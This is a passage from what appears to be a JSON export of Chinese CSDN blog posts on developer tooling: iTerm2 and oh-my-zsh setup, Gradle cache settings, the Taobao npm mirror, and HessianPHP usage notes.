<br>\n重启即可生效</li>\n</ul>\n\n\n\n<h2 id=\"其他额外工作\">其他额外工作</h2>\n\n<ul>\n<li>auto suggestions</li>\n<li>word jumping with arrow keys</li>\n<li>shorter prompt style</li>\n<li>syntax highlighting</li>\n</ul>\n\n\n\n<h3 id=\"auto-suggestions-for-oh-my-zsh\">Auto suggestions (for Oh My Zsh)</h3>\n\n<p><img src=\"http://img.blog.csdn.net/20170425233819178?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvcXV1cXU=/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/SouthEast\" alt=\"示例\" title=\"\"></p>\n\n<ol>\n<li><p>下载到本地 </p>\n\n<pre class=\"prettyprint\"><code class=\"language-source-shell hljs ruby\">git clone <span class=\"hljs-symbol\">git:</span>/<span class=\"hljs-regexp\">/github.com/zsh</span>-users/zsh-autosuggestions ~<span class=\"hljs-regexp\">/.oh-my-zsh/custom</span><span class=\"hljs-regexp\">/plugins/zsh</span>-autosuggestions</code></pre></li>\n<li><p>在<code>.zshrc</code>插件设置中添加插件</p>\n\n<pre class=\"prettyprint\"><code class=\"language-source-shell hljs fix\"><span class=\"hljs-attribute\">plugins</span>=<span class=\"hljs-string\">(zsh-autosuggestions)</span></code></pre></li>\n<li><p>重启iTerm2</p></li>\n</ol>",
			"markdowncontent":"**截图效果**:\n![效果](http://img.blog.csdn.net/20170425234900660?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvcXV1cXU=/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/SouthEast)\n## 安装ITerm2\n```source-shell\nbrew cask install iterm2\n```\n* 如果没有安装brew请在命令行执行安装brew\n```source-shell\n/usr/bin/ruby -e \"$(curl -fsSL https://raw.githubusercontent.com/Homebrew/install/master/install)\"\n```\n* 如果不想安装brew可以使用去ITerm官网[下载](http://www.iterm2.com/downloads.html)并安装.\n\n## 下载主题\n\n*   [Solarized Dark theme](https://raw.githubusercontent.com/mbadolato/iTerm2-Color-Schemes/master/schemes/Solarized%20Dark%20-%20Patched.itermcolors) \n*   [Solarized Light theme](https://raw.githubusercontent.com/altercation/solarized/master/iterm2-colors-solarized/Solarized%20Light.itermcolors)\n*   [其他主题](http://iterm2colorschemes.com/)\n\n保存到 本地后 打开iTerm-> profiles -> colors -> load presets.\n\n## 安装 [oh my zsh](https://github.com/robbyrussell/oh-my-zsh)\n### 安装命令\n```source-shell\nsh -c \"$(curl -fsSL https://raw.github.com/robbyrussell/oh-my-zsh/master/tools/install.sh)\"\n```\n下载完成后编辑`.zshrc`文件并指定主题为`agnoster`\n```source-shell\nvim ~/.zshrc\nset ZSH_THEME=\"agnoster\"\n```\n## 安装Powerlevel9k主题\n### 安装命令\n```bash\ngit clone https://github.com/bhilburn/powerlevel9k.git ~/.oh-my-zsh/custom/themes/powerlevel9k\n```\n下载完成后编辑`.zashrc`文件并指定主题\n```bash\nvim ~/.zshrc\nset ZSH_THEME=\"powerlevel9k/powerlevel9k\".\n```\n自定义设置可以参考[这里](https://github.com/bhilburn/powerlevel9k/wiki/Show-Off-Your-Config).\n## 安装字体\n*   [Meslo](https://github.com/powerline/fonts/blob/master/Meslo%20Slashed/Meslo%20LG%20M%20Regular%20for%20Powerline.ttf) \n*   [Source Code Pro](https://github.com/powerline/fonts/blob/master/SourceCodePro/Sauce%20Code%20Powerline%20Regular.otf) `@14px`字体比较协调.\n*   [Others @ powerline fonts](https://github.com/powerline/fonts)\n下载后安装字体在iTerm2设置\n iTerm -> Preferences -> Profiles -> Text -> Change Font.\n 重启即可生效\n\n## 其他额外工作\n* auto suggestions\n* word jumping with arrow keys\n* shorter prompt style\n* syntax highlighting\n### Auto suggestions (for Oh My Zsh)\n![示例](http://img.blog.csdn.net/20170425233819178?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvcXV1cXU=/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/SouthEast)\n\n1. 下载到本地 \n    ```source-shell\n    git clone git://github.com/zsh-users/zsh-autosuggestions ~/.oh-my-zsh/custom/plugins/zsh-autosuggestions\n    ```\n\n2. 在`.zshrc`插件设置中添加插件\n\n    ```source-shell\n    plugins=(zsh-autosuggestions)\n    ```\n\n3.  重启iTerm2",
			"tags":"curl,mac,brew,iTerm2,oh-my-zsh",
			"id":"70768436",
			"categories":"mac,linux",
			"status":1
		},
		"error":"",
		"status":true
	},
	{
		"data":{
			"date":"2017年04月20日 13:43:08",
			"articleedittype":1,
			"private":0,
			"channel":"16",
			"description":"在执行build、compile等任务时会解析项目配置的依赖并按照配置的仓库去搜寻下载这些依赖。默认情况下，Gradle会依照Gradle缓存->你配置的仓库的顺序依次搜寻这些依赖，并且一旦找到就会停止搜索。如果想要忽略本地缓存每次都进行远程检索可以通过在执行命令时添加–refresh-dependencies参数来强制刷新依赖\n gradle build --refresh-dependencie",
			"title":"gradle 每次运行都会下载依赖的解决办法",
			"type":"original",
			"content":"<blockquote>\n  <p>在执行build、compile等任务时会解析项目配置的依赖并按照配置的仓库去搜寻下载这些依赖。默认情况下，Gradle会依照Gradle缓存-&gt;你配置的仓库的顺序依次搜寻这些依赖，并且一旦找到就会停止搜索。如果想要忽略本地缓存每次都进行远程检索可以通过在执行命令时添加–refresh-dependencies参数来强制刷新依赖</p>\n</blockquote>\n\n\n\n<pre class=\"prettyprint\"><code class=\" hljs brainfuck\"> <span class=\"hljs-comment\">gradle</span> <span class=\"hljs-comment\">build</span> <span class=\"hljs-literal\">-</span><span class=\"hljs-literal\">-</span><span class=\"hljs-comment\">refresh</span><span class=\"hljs-literal\">-</span><span class=\"hljs-comment\">dependencies</span></code></pre>\n\n<p>当远程仓库上传了相同版本依赖时，有时需要为缓存指定一个时效去检查远程仓库的依赖笨版本，Gradle提供了<code>cacheChangingModulesFor(int, java.util.concurrent.TimeUnit)</code>, <br>\n<code>cacheDynamicVersionsFor(int, java.util.concurrent.TimeUnit)</code>两个方法来设置缓存的时效</p>\n\n\n\n<pre class=\"prettyprint\"><code class=\"language-java hljs \">configurations.all {\n    <span class=\"hljs-comment\">//每隔24小时检查远程依赖是否存在更新</span>\n     resolutionStrategy.cacheChangingModulesFor <span class=\"hljs-number\">24</span>, <span class=\"hljs-string\">'hours'</span>\n    <span class=\"hljs-comment\">//每隔10分钟..</span>\n    <span class=\"hljs-comment\">//resolutionStrategy.cacheChangingModulesFor 10, 'minutes'</span>\n    <span class=\"hljs-comment\">// 采用动态版本声明的依赖缓存10分钟</span>\n    resolutionStrategy.cacheDynamicVersionsFor <span class=\"hljs-number\">10</span>*<span class=\"hljs-number\">60</span>, <span class=\"hljs-string\">'seconds'</span>\n}\n\ndependencies {\n    <span class=\"hljs-comment\">// 添加changing: true</span>\n    compile group: <span class=\"hljs-string\">\"group\"</span>, name: <span class=\"hljs-string\">\"module\"</span>, version: <span class=\"hljs-string\">\"1.1-SNAPSHOT\"</span>, changing: <span class=\"hljs-keyword\">true</span>\n    <span class=\"hljs-comment\">//简写方式</span>\n    <span class=\"hljs-comment\">//compile('group:module:1.1-SNAPSHOT') { changing = true }</span>\n}</code></pre>\n\n<h2 id=\"缓存管理\">缓存管理</h2>\n\n\n\n<h3 id=\"缓存位置管理\">缓存位置管理</h3>\n\n<p>　　Gradle在按照配置的仓库去搜寻下载依赖时，下载的依赖默认会缓存到<code>USER_HOME/.gradle/caches</code>目录下，当然也可以手工修改这个位置。 <br>\n　　具体可以参考如下三种方式：</p>\n\n<ul>\n<li><ol><li>通过添加系统变量 <code>GRADLE_USER_HOME</code></li></ol></li>\n<li><ol><li>设置虚拟机参数 <code>org.gradle.user.home</code>属性</li></ol></li>\n<li><ol><li>通过命令行-g或者 <code>--gradle-user-home</code> 参数设置</li></ol></li>\n</ul>\n\n<h3 id=\"离线模式总是采用缓存内容\">离线模式（总是采用缓存内容）</h3>\n\n<p>　　<strong><em>Gradle</em></strong>提供了一种离线模式，可以让你构建时总是采用缓存的内容而无需去联网检查，如果你并未采用动态版本特性且可以确保项目中依赖的版本都已经缓存到了本地，这无疑是提高构建速度的一个好选择。开启离线模式只需要在执行命令时候添加–offline参数即可。当然，采用这种模式的也是有代价的，如果缓存中搜寻不到所需依赖会导致构建失败。</p>\n\n<p><code> <br>\n gradle build --offline <br>\n</code></p>",
			"markdowncontent":"> 在执行build、compile等任务时会解析项目配置的依赖并按照配置的仓库去搜寻下载这些依赖。默认情况下，Gradle会依照Gradle缓存->你配置的仓库的顺序依次搜寻这些依赖，并且一旦找到就会停止搜索。如果想要忽略本地缓存每次都进行远程检索可以通过在执行命令时添加--refresh-dependencies参数来强制刷新依赖\n\n```\n gradle build --refresh-dependencies\n```\n当远程仓库上传了相同版本依赖时，有时需要为缓存指定一个时效去检查远程仓库的依赖笨版本，Gradle提供了`cacheChangingModulesFor(int, java.util.concurrent.TimeUnit) `,\n`cacheDynamicVersionsFor(int, java.util.concurrent.TimeUnit)`两个方法来设置缓存的时效\n```java\nconfigurations.all {\n    //每隔24小时检查远程依赖是否存在更新\n     resolutionStrategy.cacheChangingModulesFor 24, 'hours'\n    //每隔10分钟..\n    //resolutionStrategy.cacheChangingModulesFor 10, 'minutes'\n    // 采用动态版本声明的依赖缓存10分钟\n    resolutionStrategy.cacheDynamicVersionsFor 10*60, 'seconds'\n}\n\ndependencies {\n    // 添加changing: true\n    compile group: \"group\", name: \"module\", version: \"1.1-SNAPSHOT\", changing: true\n    //简写方式\n    //compile('group:module:1.1-SNAPSHOT') { changing = true }\n}\n```\n## 缓存管理\n\n### 缓存位置管理\n　　Gradle在按照配置的仓库去搜寻下载依赖时，下载的依赖默认会缓存到`USER_HOME/.gradle/caches`目录下，当然也可以手工修改这个位置。\n　　具体可以参考如下三种方式：\n\n*  1. 通过添加系统变量 `GRADLE_USER_HOME`\n*  2. 设置虚拟机参数 `org.gradle.user.home `属性\n*  3. 通过命令行-g或者 `--gradle-user-home` 参数设置\n\n### 离线模式（总是采用缓存内容）\n\n　　***Gradle***提供了一种离线模式，可以让你构建时总是采用缓存的内容而无需去联网检查，如果你并未采用动态版本特性且可以确保项目中依赖的版本都已经缓存到了本地，这无疑是提高构建速度的一个好选择。开启离线模式只需要在执行命令时候添加--offline参数即可。当然，采用这种模式的也是有代价的，如果缓存中搜寻不到所需依赖会导致构建失败。\n\n ```\n gradle build --offline\n  ```",
			"tags":"gradle,缓存",
			"id":"70257552",
			"categories":"JAVA基础",
			"status":1
		},
		"error":"",
		"status":true
	},
	{
		"data":{
			"date":"2017年03月20日 09:48:14",
			"articleedittype":1,
			"private":0,
			"channel":"14",
			"description":"淘宝 npm 地址： http://npm.taobao.org/\n  如何使用 \n  有很多方法来配置npm的registry地址，下面根据不同情境列出几种比较常用的方法。以淘宝npm镜像举例：\n1.临时使用npm --registry https://registry.npm.taobao.org install express2.持久使用npm config set registry http",
			"title":"npm太慢， 淘宝npm镜像使用方法",
			"type":"repost",
			"content":"<p>淘宝 npm 地址： <a href=\"http://npm.taobao.org/\">http://npm.taobao.org/</a></p>\n\n<blockquote>\n  <p><strong><em>如何使用</em></strong> <br>\n  有很多方法来配置npm的registry地址，下面根据不同情境列出几种比较常用的方法。以淘宝npm镜像举例：</p>\n</blockquote>\n\n<h3 id=\"1临时使用\">1.临时使用</h3>\n\n\n\n<pre class=\"prettyprint\"><code class=\" hljs avrasm\">npm --registry https://registry<span class=\"hljs-preprocessor\">.npm</span><span class=\"hljs-preprocessor\">.taobao</span><span class=\"hljs-preprocessor\">.org</span> install express</code></pre>\n\n\n\n<h3 id=\"2持久使用\">2.持久使用</h3>\n\n\n\n<pre class=\"prettyprint\"><code class=\" hljs avrasm\">npm config <span class=\"hljs-keyword\">set</span> registry https://registry<span class=\"hljs-preprocessor\">.npm</span><span class=\"hljs-preprocessor\">.taobao</span><span class=\"hljs-preprocessor\">.org</span></code></pre>\n\n<ul>\n<li>配置后可通过下面方式来验证是否成功 <br>\n<code>npm config get registry</code></li>\n<li>或 <br>\n<code>npm info express</code></li>\n</ul>\n\n\n\n<h3 id=\"3通过cnpm使用\">3.通过cnpm使用</h3>\n\n\n\n<pre class=\"prettyprint\"><code class=\" hljs avrasm\">npm install -g cnpm --registry=https://registry<span class=\"hljs-preprocessor\">.npm</span><span class=\"hljs-preprocessor\">.taobao</span><span class=\"hljs-preprocessor\">.org</span></code></pre>\n\n<ul>\n<li>使用 <br>\n<code>cnpm install express</code></li>\n</ul>",
			"markdowncontent":"淘宝 npm 地址： http://npm.taobao.org/\n> ***如何使用***\n有很多方法来配置npm的registry地址，下面根据不同情境列出几种比较常用的方法。以淘宝npm镜像举例：\n\n### 1.临时使用\n```\nnpm --registry https://registry.npm.taobao.org install express\n```\n### 2.持久使用\n```\nnpm config set registry https://registry.npm.taobao.org\n```\n*  配置后可通过下面方式来验证是否成功\n`npm config get registry`\n* 或\n`npm info express`\n\n### 3.通过cnpm使用\n```\nnpm install -g cnpm --registry=https://registry.npm.taobao.org\n```\n* 使用\n`cnpm install express`",
			"tags":"npm,npm镜像",
			"id":"64121812",
			"categories":"工具使用,web-前端",
			"status":1
		},
		"error":"",
		"status":true
	},
	{
		"data":{
			"date":"2017年02月23日 17:56:41",
			"articleedittype":1,
			"private":0,
			"channel":"16",
			"description":"HessianPHP_v2.0.3.zip, 在php作客户端，java作服务器端时，使用注意事项：1.需要在php.ini中配置CURL模块:extension=php_curl.dll2.php传中文给java, 和java返回中文给php，都有中文乱码问题：1) php和java文件本身都采用UTF-8编码2)在php.ini中开启mbstring模块:extension=php_mbstri",
			"title":"HessianPHP使用注意事项",
			"type":"repost",
			"content":"<p>HessianPHP_v2.0.3.zip, 在php作客户端，java作服务器端时，使用注意事项：</p>\n\n\n\n<h3 id=\"1需要在phpini中配置curl模块\">1.需要在php.ini中配置CURL模块:</h3>\n\n<pre class=\"prettyprint\"><code class=\" hljs fix\"><span class=\"hljs-attribute\">extension</span>=<span class=\"hljs-string\">php_curl.dll</span></code></pre>\n\n\n\n<h3 id=\"2php传中文给java-和java返回中文给php都有中文乱码问题\">2.php传中文给java, 和java返回中文给php，都有中文乱码问题：</h3>\n\n\n\n<h4 id=\"1-php和java文件本身都采用utf-8编码\">1) php和java文件本身都采用UTF-8编码</h4>\n\n\n\n<h4 id=\"2在phpini中开启mbstring模块\">2)在php.ini中开启mbstring模块:</h4>\n\n\n\n<pre class=\"prettyprint\"><code class=\" hljs fix\"><span class=\"hljs-attribute\">extension</span>=<span class=\"hljs-string\">php_mbstring.dll</span></code></pre>\n\n<p>同时配置：</p>\n\n\n\n<pre class=\"prettyprint\"><code class=\" hljs fix\"><span class=\"hljs-attribute\">mbstring.internal_encoding </span>=<span class=\"hljs-string\"> UTF-8</span></code></pre>\n\n<p>因为： <br>\nHessian2Writer.php文件：</p>\n\n<pre><code>function writeStringData($string){\n    return HessianUtils::writeUTF8($string);\n}\n</code></pre>\n\n<p>HessianUtils.php文件：</p>\n\n<pre><code>public static function isInternalUTF8(){\n    $encoding = ini_get('mbstring.internal_encoding');\n    if(!$encoding)\n        return false;\n    return $encoding == 'UTF-8';\n}\n</code></pre>\n\n\n\n<h4 id=\"3response返回设置为utf-8\">3).response返回设置为UTF-8：</h4>\n\n<p>header(“Content-Type: text/html; charset=UTF-8”);</p>\n\n<p>或者,统一改php.ini文件： <br>\n<code>mbstring.http_output = UTF-8</code> <br>\n;启用字符转换功能 <br>\n<code>output_handler = mb_output_handler</code></p>\n\n\n\n<h4 id=\"4默认配置\">4)默认配置：</h4>\n\n<p>HessianFactory.php <br>\ndefine(‘HESSIAN_PHP_VERSION’, ‘2.0’);  ———&gt;hessian 2.0协议</p>\n\n<pre><code>    $this-&gt;transports = array(\n        'CURL' =&gt; 'HessianCURLTransport',  -----------&gt;传输协议\n        'curl' =&gt; 'HessianCURLTransport',\n        'http' =&gt; 'HessianHttpStreamTransport'\n    );\n</code></pre>\n\n\n\n<h3 id=\"3java返回值问题\">3.java返回值问题:</h3>\n\n\n\n<h4 id=\"1java端返回自定义的对象在php端为stdclass-object-它具有一个属性-type-orgmodeluser\">1).java端返回(自定义的)对象，在php端为stdClass Object, 它具有一个属性 [__type] =&gt; org.model.User</h4>\n\n\n\n<h4 id=\"2而对于普通对象例如java的date对象在php就是datetime对象\">2).而对于普通对象,例如java的Date对象，在php就是DateTime对象：</h4>\n\n\n\n<pre class=\"prettyprint\"><code class=\" hljs php\">[birthday] =&gt; DateTime Object ( [date] =&gt; <span class=\"hljs-number\">2012</span>-<span class=\"hljs-number\">07</span>-<span class=\"hljs-number\">27</span> <span class=\"hljs-number\">15</span>:<span class=\"hljs-number\">27</span>:<span class=\"hljs-number\">31</span> [timezone_type] =&gt; <span class=\"hljs-number\">1</span> [timezone] =&gt; +<span class=\"hljs-number\">00</span>:<span class=\"hljs-number\">00</span> )</code></pre>\n\n\n\n<h4 id=\"3java的list-set-map在php就是array\">3).java的List, Set, Map，在php就是Array.</h4>\n\n<p>List为php的序号数组:</p>\n\n\n\n<pre class=\"prettyprint\"><code class=\" hljs php\">[productList1] =&gt; <span class=\"hljs-keyword\">Array</span> (\n     [<span class=\"hljs-number\">0</span>] =&gt; stdClass Object ( [__type] =&gt; org.model.Product [name] =&gt; 布匹 [price] =&gt; <span class=\"hljs-number\">300</span> )\n)</code></pre>\n\n<p>Map为php的名称数组:</p>\n\n\n\n<pre class=\"prettyprint\"><code class=\" hljs php\">[productMap] =&gt; <span class=\"hljs-keyword\">Array</span> (\n     [布匹] =&gt; stdClass Object ( [__type] =&gt; org.model.Product [name] =&gt; 布匹 [price] =&gt; <span class=\"hljs-number\">300</span> )\n)</code></pre>\n\n<p>java的返回值，php端不需要做任何特殊映射，可以直接采用-&gt;x-&gt;y的方式去取值显示.</p>\n\n\n\n<h4 id=\"4同一个对象即放在list中又放在map中返回值中为什么只显示一处有值\">4).同一个对象，即放在List中，又放在Map中，返回值中为什么只显示一处有值？</h4>\n\n<p>这其实是HessianPHP_v2.0.3.zip的一个bug. <br>\nhessian协议中为了减少重复对象的序列化，采用了引用的方式，参见： <br>\nHessian 2.0 序列化协议规范 <br>\n<a href=\"http://wenku.baidu.com/view/3832199951e79b8968022641.html\">http://wenku.baidu.com/view/3832199951e79b8968022641.html</a></p>\n\n<p>经过debug调试，发现： <br>\n需要修改Hessian2Parser.php中</p>\n\n\n\n<pre class=\"prettyprint\"><code class=\" hljs perl\">function untypedMap(<span class=\"hljs-variable\">$code</span>, <span class=\"hljs-variable\">$num</span>){\n<span class=\"hljs-regexp\">//</span>             <span class=\"hljs-keyword\">if</span>(HessianRef::isRef(<span class=\"hljs-variable\">$key</span>)) <span class=\"hljs-variable\">$key</span> = &amp;<span class=\"hljs-variable\">$this</span>-&gt;objectlist-&gt;reflist[<span class=\"hljs-variable\">$key</span>-&gt;<span class=\"hljs-keyword\">index</span>];\n<span class=\"hljs-regexp\">//</span>             <span class=\"hljs-keyword\">if</span>(HessianRef::isRef(<span class=\"hljs-variable\">$value</span>)) <span class=\"hljs-variable\">$value</span> = &amp;<span class=\"hljs-variable\">$this</span>-&gt;objectlist-&gt;reflist[<span class=\"hljs-variable\">$value</span>-&gt;<span class=\"hljs-keyword\">index</span>];\n            <span class=\"hljs-keyword\">if</span>(HessianRef::isRef(<span class=\"hljs-variable\">$key</span>)) <span class=\"hljs-variable\">$key</span> = <span class=\"hljs-variable\">$this</span>-&gt;refmap-&gt;objectlist[<span class=\"hljs-variable\">$value</span>-&gt;<span class=\"hljs-keyword\">index</span>];\n            <span class=\"hljs-keyword\">if</span>(HessianRef::isRef(<span class=\"hljs-variable\">$value</span>)) <span class=\"hljs-variable\">$value</span> = <span class=\"hljs-variable\">$this</span>-&gt;refmap-&gt;objectlist[<span class=\"hljs-variable\">$value</span>-&gt;<span class=\"hljs-keyword\">index</span>];\n\n}</code></pre>\n\n<p>同样下面方法也需要修改: <br>\nfunction typedMap(<span class=\"MathJax_Preview\"></span><span class=\"MathJax\" id=\"MathJax-Element-1241-Frame\" role=\"textbox\" aria-readonly=\"true\"><nobr><span class=\"math\" id=\"MathJax-Span-45224\" style=\"width: 2.614em; display: inline-block;\"><span style=\"display: inline-block; position: relative; width: 2.169em; height: 0px; font-size: 120%;\"><span style=\"position: absolute; clip: rect(1.669em 1000em 2.836em -0.442em); top: -2.497em; left: 0.003em;\"><span class=\"mrow\" id=\"MathJax-Span-45225\"><span class=\"mi\" id=\"MathJax-Span-45226\" style=\"font-family: STIXGeneral-Italic;\">c</span><span class=\"mi\" id=\"MathJax-Span-45227\" style=\"font-family: STIXGeneral-Italic;\">o</span><span class=\"mi\" id=\"MathJax-Span-45228\" style=\"font-family: STIXGeneral-Italic;\">d<span style=\"display: inline-block; overflow: hidden; height: 1px; width: 0.003em;\"></span></span><span class=\"mi\" id=\"MathJax-Span-45229\" style=\"font-family: STIXGeneral-Italic;\">e</span><span class=\"mo\" id=\"MathJax-Span-45230\" style=\"font-family: STIXGeneral-Regular;\">,</span></span><span style=\"display: inline-block; width: 0px; height: 2.503em;\"></span></span></span><span style=\"border-left: 0.003em solid; display: inline-block; overflow: hidden; width: 0px; height: 1.137em; vertical-align: -0.263em;\"></span></span></nobr></span><script type=\"math/tex\" id=\"MathJax-Element-1241\">code, </script>num) <br>\n{ <br>\n… <br>\n}</p>\n\n<p>测试结果： <br>\nobjectstdClass Object ( [__type] =&gt; User [name] =&gt; yangwenchao杨文超 [country] =&gt; CHINA [birthday] =&gt; DateTime Object ( [date] =&gt; 2012-07-28 09:02:32 [timezone_type] =&gt; 1 [timezone] =&gt; +00:00 ) [productList1] =&gt; Array ( [0] =&gt; stdClass Object ( [__type] =&gt; Product [name] =&gt; 布匹 [price] =&gt; 300 ) ) [productList2] =&gt; Array ( ) [productList3] =&gt; [productMap] =&gt; Array ( [布匹一] =&gt; stdClass Object ( [__type] =&gt; Product [name] =&gt; 布匹 [price] =&gt; 300 ) [布匹二] =&gt;stdClass Object ( [__type] =&gt; Product [name] =&gt; 布匹 [price] =&gt; 300 ) ) )</p>\n\n\n\n<h3 id=\"4php向java传参问题\">4.php向java传参问题:</h3>\n\n\n\n<h3 id=\"5关于类型映射\">5.关于类型映射：</h3>\n\n<p>php是无类型的，默认情况下远程的Object都会变成php的stdClass这样的万能对象。持有这样的对象进行访问的时候，关于对象的属性name, price等信息需要尝试指定。（工作正常）</p>\n\n<p>但是如果把远程Object映射成php本地的自定义的phpObject以后，就可以用一个对象的模子class来框住对象的实体形式，而且编辑器还可以支持语法提示功能。</p>\n\n<p>采用这种方式，在解析返回值时，可以得到便利，在向Java传递对象作为参数时，也可以提供一些便利。</p>\n\n\n\n<pre class=\"prettyprint\"><code class=\" hljs php\"><span class=\"hljs-variable\">$options</span> = <span class=\"hljs-keyword\">new</span> HessianOptions();\n<span class=\"hljs-variable\">$options</span>-&gt;typeMap[<span class=\"hljs-string\">'Person'</span>] = <span class=\"hljs-string\">'*.Person'</span>;\n<span class=\"hljs-variable\">$options</span>-&gt;typeMap[<span class=\"hljs-string\">'CalendarHandler'</span>] = <span class=\"hljs-string\">'com.caucho.hessian.io.CalendarHandle'</span>;\n<span class=\"hljs-variable\">$options</span>-&gt;parseFilters[<span class=\"hljs-string\">'@CalendarHandler'</span>] = <span class=\"hljs-keyword\">array</span>(<span class=\"hljs-string\">'CalendarHandler'</span>,<span class=\"hljs-string\">'calendarToDateTime'</span>);\n<span class=\"hljs-variable\">$options</span>-&gt;writeFilters[<span class=\"hljs-string\">'@Person'</span>] = <span class=\"hljs-keyword\">array</span>(<span class=\"hljs-string\">'CalendarHandler'</span>,<span class=\"hljs-string\">'writePerson'</span>);</code></pre>\n\n<p>参见例子：</p>\n\n<p><a href=\"http://code.google.com/p/hessianphp/wiki/AdvancedExample\">AdvancedExample  Advanced type mapping and filtering</a></p>\n\n<p>如果不采用自动映射方式，php向java传参时，只能采用php原生的stdClass来传值：</p>\n\n\n\n<pre class=\"prettyprint\"><code class=\" hljs lasso\">        <span class=\"hljs-variable\">$person</span> <span class=\"hljs-subst\">=</span> <span class=\"hljs-literal\">new</span> stdClass();      \n        <span class=\"hljs-variable\">$person</span><span class=\"hljs-subst\">-&gt;</span>__type <span class=\"hljs-subst\">=</span> <span class=\"hljs-string\">'org.model.Person'</span>; <span class=\"hljs-comment\">//参照java返回值的形式，添加上__type属性，其实无效.</span>\n        <span class=\"hljs-variable\">$person</span><span class=\"hljs-subst\">-&gt;</span>id <span class=\"hljs-subst\">=</span> <span class=\"hljs-number\">1</span>;\n        <span class=\"hljs-variable\">$person</span><span class=\"hljs-subst\">-&gt;</span>firstName <span class=\"hljs-subst\">=</span> <span class=\"hljs-string\">'杨'</span>;\n        <span class=\"hljs-variable\">$person</span><span class=\"hljs-subst\">-&gt;</span>lastName <span class=\"hljs-subst\">=</span> <span class=\"hljs-string\">'文超'</span>;\n        <span class=\"hljs-comment\">//$person-&gt;birthDate = '';       </span>\n\n        <span class=\"hljs-variable\">$user</span> <span class=\"hljs-subst\">=</span> <span class=\"hljs-variable\">$proxy</span><span class=\"hljs-subst\">-&gt;</span>getUserABC(<span class=\"hljs-variable\">$person</span>);</code></pre>\n\n<p>在java端，总是抛出warning, 显然，java端无视了参数$person-&gt;__type的意义： <br>\njava.lang.ClassNotFoundException: stdClass <br>\n2012-7-28 11:13:22 com.caucho.hessian.io.SerializerFactory getDeserializer <br>\n警告: Hessian/Burlap: ‘stdClass’ is an unknown class in WebappClassLoader <br>\n  context: /springhessian <br>\n  delegate: false <br>\n  repositories: <br>\n    /WEB-INF/classes/ <br>\n———-&gt; Parent Classloader: <br>\norg.apache.catalina.loader.StandardClassLoader@1adc30</p>\n\n<p>去掉warning的解决办法：</p>\n\n\n\n<pre class=\"prettyprint\"><code class=\" hljs bash\"><span class=\"hljs-variable\">$options</span>-&gt;<span class=\"hljs-built_in\">type</span>Map[<span class=\"hljs-string\">'stdClass'</span>] = <span class=\"hljs-string\">'org.model.Person'</span>;\n\n        <span class=\"hljs-variable\">$options</span> = new HessianOptions();\n        <span class=\"hljs-variable\">$options</span>-&gt;<span class=\"hljs-built_in\">type</span>Map[<span class=\"hljs-string\">'stdClass'</span>] = <span class=\"hljs-string\">'org.model.Person'</span>;       \n\n        <span class=\"hljs-variable\">$url</span> = <span class=\"hljs-string\">\"http://localhost:8080/springhessian/remoting/hessianService\"</span>; \n        <span class=\"hljs-variable\">$proxy</span> = new HessianClient(<span class=\"hljs-variable\">$url</span>, <span class=\"hljs-variable\">$options</span>); \n        <span class=\"hljs-built_in\">echo</span> <span class=\"hljs-string\">\"\n\"</span>; \n\n        <span class=\"hljs-variable\">$person</span> = new stdClass();      \n        <span class=\"hljs-variable\">$person</span>-&gt;__<span class=\"hljs-built_in\">type</span> = <span class=\"hljs-string\">'org.model.Person'</span>;\n        <span class=\"hljs-variable\">$person</span>-&gt;id = <span class=\"hljs-number\">1</span>;\n        <span class=\"hljs-variable\">$person</span>-&gt;firstName = <span class=\"hljs-string\">'杨'</span>;\n        <span class=\"hljs-variable\">$person</span>-&gt;lastName = <span class=\"hljs-string\">'文超'</span>;\n        //<span class=\"hljs-variable\">$person</span>-&gt;birthDate = <span class=\"hljs-string\">''</span>;       \n\n        <span class=\"hljs-variable\">$user</span> = <span class=\"hljs-variable\">$proxy</span>-&gt;getUserABC(<span class=\"hljs-variable\">$person</span>);</code></pre>\n\n<p>工作正常。</p>\n\n<p>但是这种方法，只能应对一个类型参数，如果有两个类型的参数，如org.model.Person和org.model.Company，就又无法正常工作了, 因为stdClass不知道到底需要映射到哪一个Java类型上。</p>\n\n<p>所以，在php向java传参时，需要在php中自定义若干个与java相对应的类型，配合 <br>\n$options-&gt;typeMap[‘Person’] = ‘org.model.Person’; <br>\n来一起完成参数类型映射功能。 <br>\n例如：</p>\n\n\n\n<pre class=\"prettyprint\"><code class=\" hljs php\"><span class=\"hljs-class\"><span class=\"hljs-keyword\">class</span> <span class=\"hljs-title\">Person</span>{</span>\n        <span class=\"hljs-keyword\">var</span> <span class=\"hljs-variable\">$id</span>;\n        <span class=\"hljs-keyword\">var</span> <span class=\"hljs-variable\">$firstName</span>;\n        <span class=\"hljs-keyword\">var</span> <span class=\"hljs-variable\">$lastName</span>;\n        <span class=\"hljs-keyword\">var</span> <span class=\"hljs-variable\">$birthDate</span>;\n}\n<span class=\"hljs-variable\">$p</span> = <span class=\"hljs-keyword\">new</span> Person();\n<span class=\"hljs-variable\">$p</span>-&gt;firtName = <span class=\"hljs-string\">'John'</span>;\n<span class=\"hljs-variable\">$p</span>-&gt;lastName = <span class=\"hljs-string\">'Sheppard'</span>;\n<span class=\"hljs-variable\">$options</span> = <span class=\"hljs-keyword\">new</span> HessianOptions();\n<span class=\"hljs-variable\">$options</span>-&gt;typeMap[<span class=\"hljs-string\">'Person'</span>] = <span class=\"hljs-string\">'com.sample.hessian.Person'</span>;\n<span class=\"hljs-variable\">$proxy</span> = <span class=\"hljs-keyword\">new</span> HessianClient(<span class=\"hljs-variable\">$url</span>, <span class=\"hljs-variable\">$options</span>);\n<span class=\"hljs-variable\">$result</span> = <span class=\"hljs-variable\">$proxy</span>-&gt;add(<span class=\"hljs-variable\">$p</span>);\nprint_r(<span class=\"hljs-variable\">$result</span>);</code></pre>\n\n<p>另外： <br>\n<span class=\"MathJax_Preview\"></span><span class=\"MathJax\" id=\"MathJax-Element-1837-Frame\" role=\"textbox\" aria-readonly=\"true\"><nobr><span class=\"math\" id=\"MathJax-Span-73580\" style=\"width: 45.947em; display: inline-block;\"><span style=\"display: inline-block; position: relative; width: 38.281em; height: 0px; font-size: 120%;\"><span style=\"position: absolute; clip: rect(3.058em 1000em 5.836em -0.497em); top: -3.997em; left: 